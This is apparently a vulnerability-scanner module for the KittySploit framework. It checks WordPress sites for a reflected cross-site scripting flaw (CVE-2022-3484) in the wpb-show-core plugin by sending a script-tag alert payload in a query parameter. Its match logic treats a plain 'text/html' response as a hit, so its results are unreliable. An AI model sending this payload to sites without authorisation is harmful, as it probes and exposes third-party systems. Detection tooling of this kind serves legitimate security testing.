#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""WordPress wpb-show-core plugin through TODO contains a cross-site scripting vulnerability."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WordPress WPB Show Core - Cross-Site Scripting Detection',
        'description': 'WordPress wpb-show-core plugin through TODO contains a cross-site scripting vulnerability. The plugin does not sanitize and escape a parameter before outputting it back in the page. An attacker can inject arbitrary script in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2022', 'wpscan', 'wp-plugin', 'wp', 'wordpress', 'xss', 'wpb-show-core', 'wpb_show_core_project', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://wpscan.com/vulnerability/3afaed61-6187-4915-acf0-16e79d5c2464',
            'https://nvd.nist.gov/vuln/detail/CVE-2022-3484',
            'https://github.com/ARPSyndicate/kenzer-templates',
        ],
        'cve': 'CVE-2022-3484',
    }

    def run(self):
        r = self.http_request(method="GET", path='/wp-content/plugins/wpb-show-core/modules/jplayer_new/jplayer_twitter_ver_1.php?audioPlayerOption=1&fileList[0][title]=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('text/html', 'wpb_jplayer_setting', '<script>alert(document.domain)</script>',)
        if (any(m in body for m in body_any)):
            self.set_info(
                severity='medium',
                reason="WordPress WPB Show Core - Cross-Site Scripting detected",
                path='/wp-content/plugins/wpb-show-core/modules/jplayer_new/jplayer_twitter_ver_1.php?audioPlayerOption=1&fileList[0][title]=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E',
            )
            return True
        return False

